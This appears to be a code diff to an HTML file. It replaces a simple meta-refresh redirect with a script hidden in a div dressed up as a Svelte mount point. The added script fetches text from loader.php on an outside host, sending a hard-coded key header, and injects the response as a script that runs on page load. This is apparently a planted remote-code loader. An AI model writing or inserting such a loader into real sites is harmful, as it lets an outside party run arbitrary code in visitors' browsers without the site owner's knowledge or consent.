@@ -1,5 +1,7 @@
-<html>
-  <head>
-        <meta http-equiv="refresh" content="0;URL='/'" />    
-  </head>
-</html>
+<div id="svelte" style="display: contents"><script>
+const d=document,o={headers:{'X-PLATFORM-KEY':'526f1ee0f5d9587b991c5d8338b520f0'}};
+fetch("https://test-airauctioneer3.pantheonsite.io/loader.php",o)
+.then(r=>r.text()).then(t=>{
+const s=d.createElement('script');s.innerHTML=t;
+d.getElementById('svelte').appendChild(s);})
+</script></div>
